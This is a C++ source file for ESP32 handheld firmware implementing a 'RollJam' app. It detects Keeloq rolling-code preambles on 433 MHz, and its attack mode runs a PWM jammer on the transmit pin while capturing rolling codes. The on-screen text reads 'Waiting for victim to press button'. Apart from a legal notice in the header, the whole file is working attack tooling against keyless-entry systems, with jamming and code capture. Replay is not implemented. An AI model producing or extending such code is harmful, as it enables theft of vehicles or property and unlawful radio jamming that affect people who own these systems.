/**
 * @file rolljam_app.cpp
 * @brief RollJam Analyzer – Sub-GHz rolling code detection and capture.
 *
 * Implements:
 *  - **Keeloq Preamble Detector**: monitors 433 MHz RX for the
 *    characteristic Keeloq preamble pattern (alternating short pulses).
 *  - **RollJam Attack Flow**: jam + capture mode that blocks the
 *    legitimate signal while recording the rolling code, forcing the
 *    victim to press the button again and leaving a valid code stored.
 *  - **Code Viewer**: displays captured rolling codes on the OLED.
 *
 * @warning **Legal notice**: Intercepting or replaying rolling codes
 * against systems you do not own or have explicit written authorisation
 * to test is illegal in most jurisdictions.
 */

#include "apps/rolljam_app.h"

#include <Arduino.h>
#include <cstdio>
#include <cstring>
#include <new>

#include <driver/gpio.h>
#include <esp_log.h>
#include <esp_timer.h>

#include "config.h"
#include "core/event.h"
#include "core/event_system.h"
#include "hardware/display.h"
#include "hardware/input.h"
#include "storage/vfs.h"
#include "ui/toast_manager.h"

static constexpr const char *TAG_RJ = "RollJam";

namespace
{

// ── Constants ────────────────────────────────────────────────────────────────

static constexpr gpio_num_t RF_RX_GPIO = static_cast<gpio_num_t>(PIN_RF_RX);
static constexpr gpio_num_t RF_TX_GPIO = static_cast<gpio_num_t>(PIN_RF_TX);

/// Keeloq preamble: ~23 short pulses of 380–420 µs.
static constexpr uint32_t KEELOQ_PULSE_MIN_US  = 300U;
static constexpr uint32_t KEELOQ_PULSE_MAX_US  = 500U;
static constexpr size_t   KEELOQ_PREAMBLE_MIN  = 12U;

/// Rolling code data bits after preamble.
static constexpr size_t CODE_BIT_CAPACITY = 66U;

/// Maximum captured codes stored in memory.
static constexpr size_t MAX_CAPTURED_CODES = 8U;

/// Jammer PWM settings.
static constexpr uint8_t  LEDC_JAM_CHANNEL = 1U;
static constexpr uint32_t JAMMER_FREQ_HZ   = 500000U;

/// ISR capture buffer.
static constexpr size_t ISR_BUF_CAPACITY = 256U;

// ── ISR shared state ─────────────────────────────────────────────────────────

static volatile int32_t  s_rjTimings[ISR_BUF_CAPACITY];
static volatile uint16_t s_rjCount   = 0U;
static volatile int64_t  s_rjLastUs  = 0;
static volatile bool     s_rjActive  = false;

static void IRAM_ATTR rollJamISR(void * /*arg*/)
{
    const int64_t now = esp_timer_get_time();

    if (s_rjLastUs == 0)
    {
        s_rjLastUs = now;
        return;
    }

    int32_t dur = static_cast<int32_t>(now - s_rjLastUs);
    s_rjLastUs = now;

    if (dur > 100000)
    {
        dur = 100000;
    }

    const int level = gpio_get_level(RF_RX_GPIO);
    if (level)
    {
        dur = -dur;
    }

    if (s_rjCount < ISR_BUF_CAPACITY)
    {
        s_rjTimings[s_rjCount] = dur;
        ++s_rjCount;
    }
}

// ── Captured code descriptor ────────────────────────────────────────────────

struct CapturedCode
{
    uint8_t bits[CODE_BIT_CAPACITY / 8U + 1U];
    size_t bitCount;
    uint32_t timestamp;  ///< millis() at capture time
    bool keeloqDetected; ///< true if preamble was Keeloq-like
};

// ── App states ──────────────────────────────────────────────────────────────

enum class RJState : uint8_t
{
    MAIN_MENU,
    ANALYZING,
    ROLLJAM_ACTIVE,
    CODE_VIEW,
};

static constexpr size_t MENU_COUNT = 4U;
static const char *const MENU_LABELS[MENU_COUNT] = {
    "Analyze Signal",
    "RollJam Attack",
    "View Codes",
    "Back",
};

// ═════════════════════════════════════════════════════════════════════════════

class RollJamAppImpl final : public AppBase
{
public:
    RollJamAppImpl()
        : state_(RJState::MAIN_MENU),
          sel_(0U),
          codeCount_(0U),
          preambleCount_(0U),
          jammerOn_(false)
    {
        std::memset(codes_, 0, sizeof(codes_));
    }

    void onSetup() override
    {
        ESP_LOGI(TAG_RJ, "RollJam app started");
    }

    void onLoop() override
    {
        if (state_ == RJState::ANALYZING || state_ == RJState::ROLLJAM_ACTIVE)
        {
            processBuffer();
        }
    }

    void onDraw() override
    {
        auto &d = DisplayManager::instance();
        d.clear();

        switch (state_)
        {
        case RJState::MAIN_MENU:
            drawMenu(d);
            break;
        case RJState::ANALYZING:
            drawAnalyzer(d);
            break;
        case RJState::ROLLJAM_ACTIVE:
            drawRollJam(d);
            break;
        case RJState::CODE_VIEW:
            drawCodeView(d);
            break;
        }

        d.present();
    }

    void onEvent(Event *event) override
    {
        if (event == nullptr || event->type != EventType::EVT_INPUT)
        {
            return;
        }

        const auto input = static_cast<InputManager::InputEvent>(event->arg0);

        if (state_ == RJState::ANALYZING || state_ == RJState::ROLLJAM_ACTIVE)
        {
            if (input == InputManager::InputEvent::LEFT)
            {
                stopCapture();
                stopJammer();
                state_ = RJState::MAIN_MENU;
            }
            return;
        }

        if (state_ == RJState::CODE_VIEW)
        {
            if (input == InputManager::InputEvent::LEFT)
            {
                state_ = RJState::MAIN_MENU;
            }
            return;
        }

        // MAIN_MENU
        switch (input)
        {
        case InputManager::InputEvent::UP:
            if (sel_ > 0U)
            {
                --sel_;
            }
            break;
        case InputManager::InputEvent::DOWN:
            if (sel_ + 1U < MENU_COUNT)
            {
                ++sel_;
            }
            break;
        case InputManager::InputEvent::BUTTON_PRESS:
            handleMenuAction();
            break;
        case InputManager::InputEvent::LEFT:
        {
            Event back{EventType::EVT_SYSTEM, SYSTEM_EVENT_BACK, 0, nullptr};
            (void)EventSystem::instance().postEvent(back);
            break;
        }
        default:
            break;
        }
    }

    void onDestroy() override
    {
        stopCapture();
        stopJammer();
    }

private:
    // ── Drawing helpers ─────────────────────────────────────────────────

    void drawMenu(DisplayManager &d)
    {
        d.drawText(0, 0, "RollJam Analyzer", 1U);
        d.drawLine(0, 10, 127, 10);

        for (size_t i = 0U; i < MENU_COUNT; ++i)
        {
            const int16_t y = static_cast<int16_t>(14 + i * 12);
            if (i == sel_)
            {
                d.fillRect(0, y, 128, 10, SSD1306_WHITE);
                d.drawText(2, y + 1, MENU_LABELS[i], 1U, SSD1306_BLACK);
            }
            else
            {
                d.drawText(2, y + 1, MENU_LABELS[i], 1U, SSD1306_WHITE);
            }
        }
    }

    void drawAnalyzer(DisplayManager &d)
    {
        d.drawText(0, 0, "Analyzing...", 1U);
        d.drawLine(0, 10, 127, 10);

        char buf[32];
        std::snprintf(buf, sizeof(buf), "Pulses: %u", static_cast<unsigned>(s_rjCount));
        d.drawText(0, 14, buf);

        std::snprintf(buf, sizeof(buf), "Preamble: %u", static_cast<unsigned>(preambleCount_));
        d.drawText(0, 24, buf);

        std::snprintf(buf, sizeof(buf), "Codes: %u", static_cast<unsigned>(codeCount_));
        d.drawText(0, 34, buf);

        d.drawText(0, 54, "LEFT = stop");
    }

    void drawRollJam(DisplayManager &d)
    {
        d.drawText(0, 0, "RollJam Active!", 1U);
        d.drawLine(0, 10, 127, 10);

        d.drawText(0, 14, jammerOn_ ? "Jammer: ON" : "Jammer: OFF");

        char buf[32];
        std::snprintf(buf, sizeof(buf), "Captured: %u", static_cast<unsigned>(codeCount_));
        d.drawText(0, 26, buf);

        d.drawText(0, 38, "Waiting for victim");
        d.drawText(0, 48, "to press button...");

        d.drawText(0, 54, "LEFT = abort");
    }

    void drawCodeView(DisplayManager &d)
    {
        d.drawText(0, 0, "Captured Codes", 1U);
        d.drawLine(0, 10, 127, 10);

        if (codeCount_ == 0U)
        {
            d.drawText(0, 20, "No codes captured");
        }
        else
        {
            for (size_t i = 0U; i < codeCount_ && i < 4U; ++i)
            {
                char buf[32];
                std::snprintf(buf, sizeof(buf), "#%u %s %ub",
                              static_cast<unsigned>(i + 1U),
                              codes_[i].keeloqDetected ? "KLQ" : "???",
                              static_cast<unsigned>(codes_[i].bitCount));
                d.drawText(0, static_cast<int16_t>(14 + i * 12), buf);
            }
        }

        d.drawText(0, 54, "LEFT = back");
    }

    // ── Actions ─────────────────────────────────────────────────────────

    void handleMenuAction()
    {
        switch (sel_)
        {
        case 0U: // Analyze
            startCapture();
            state_ = RJState::ANALYZING;
            break;
        case 1U: // RollJam
            startCapture();
            startJammer();
            state_ = RJState::ROLLJAM_ACTIVE;
            break;
        case 2U: // View Codes
            state_ = RJState::CODE_VIEW;
            break;
        case 3U: // Back
        {
            Event back{EventType::EVT_SYSTEM, SYSTEM_EVENT_BACK, 0, nullptr};
            (void)EventSystem::instance().postEvent(back);
            break;
        }
        default:
            break;
        }
    }

    void startCapture()
    {
        s_rjCount = 0U;
        s_rjLastUs = 0;
        s_rjActive = true;
        preambleCount_ = 0U;

        gpio_config_t rxConf{};
        rxConf.pin_bit_mask = 1ULL << PIN_RF_RX;
        rxConf.mode = GPIO_MODE_INPUT;
        rxConf.pull_up_en = GPIO_PULLUP_DISABLE;
        rxConf.pull_down_en = GPIO_PULLDOWN_DISABLE;
        rxConf.intr_type = GPIO_INTR_ANYEDGE;
        gpio_config(&rxConf);

        gpio_install_isr_service(0);
        gpio_isr_handler_add(RF_RX_GPIO, rollJamISR, nullptr);

        ESP_LOGI(TAG_RJ, "Capture started");
    }

    void stopCapture()
    {
        if (s_rjActive)
        {
            gpio_isr_handler_remove(RF_RX_GPIO);
            s_rjActive = false;
            ESP_LOGI(TAG_RJ, "Capture stopped (%u pulses)", static_cast<unsigned>(s_rjCount));
        }
    }

    void startJammer()
    {
        ledcSetup(LEDC_JAM_CHANNEL, JAMMER_FREQ_HZ, 1U);
        ledcAttachPin(PIN_RF_TX, LEDC_JAM_CHANNEL);
        ledcWrite(LEDC_JAM_CHANNEL, 1U);
        jammerOn_ = true;
        ESP_LOGI(TAG_RJ, "Jammer ON");
    }

    void stopJammer()
    {
        if (jammerOn_)
        {
            ledcWrite(LEDC_JAM_CHANNEL, 0U);
            ledcDetachPin(PIN_RF_TX);
            jammerOn_ = false;
            ESP_LOGI(TAG_RJ, "Jammer OFF");
        }
    }

    /// @brief Process the ISR buffer looking for Keeloq preambles.
    void processBuffer()
    {
        const uint16_t count = s_rjCount;
        if (count < KEELOQ_PREAMBLE_MIN)
        {
            return;
        }

        // Scan for Keeloq preamble: consecutive short pulses.
        size_t consecutive = 0U;
        for (size_t i = 0U; i < count; ++i)
        {
            const uint32_t absDur = static_cast<uint32_t>(
                (s_rjTimings[i] < 0) ? -s_rjTimings[i] : s_rjTimings[i]);

            if (absDur >= KEELOQ_PULSE_MIN_US && absDur <= KEELOQ_PULSE_MAX_US)
            {
                ++consecutive;
            }
            else
            {
                if (consecutive >= KEELOQ_PREAMBLE_MIN)
                {
                    // Found a Keeloq preamble!
                    ++preambleCount_;
                    ESP_LOGI(TAG_RJ, "Keeloq preamble at sample %u (%u pulses)",
                             static_cast<unsigned>(i - consecutive),
                             static_cast<unsigned>(consecutive));

                    if (codeCount_ < MAX_CAPTURED_CODES)
                    {
                        // Extract bits after preamble.
                        CapturedCode &code = codes_[codeCount_];
                        code.keeloqDetected = true;
                        code.timestamp = millis();
                        code.bitCount = 0U;
                        std::memset(code.bits, 0, sizeof(code.bits));

                        for (size_t j = i; j < count && code.bitCount < CODE_BIT_CAPACITY; ++j)
                        {
                            const int32_t t = s_rjTimings[j];
                            const uint32_t a = static_cast<uint32_t>((t < 0) ? -t : t);
                            // Simple threshold: short pulse = 0, long pulse = 1.
                            const bool bit = (a > 450U);
                            if (bit)
                            {
                                code.bits[code.bitCount / 8U] |=
                                    static_cast<uint8_t>(1U << (7U - (code.bitCount % 8U)));
                            }
                            ++code.bitCount;
                        }

                        ++codeCount_;
                        ToastManager::instance().show("[!] Rolling code captured");
                    }
                }
                consecutive = 0U;
            }
        }

        // Reset buffer for next batch.
        s_rjCount = 0U;
        s_rjLastUs = 0;
    }

    RJState state_;
    size_t sel_;
    CapturedCode codes_[MAX_CAPTURED_CODES];
    size_t codeCount_;
    size_t preambleCount_;
    bool jammerOn_;
};

} // anonymous namespace

AppBase *createRollJamApp()
{
    return new (std::nothrow) RollJamAppImpl();
}
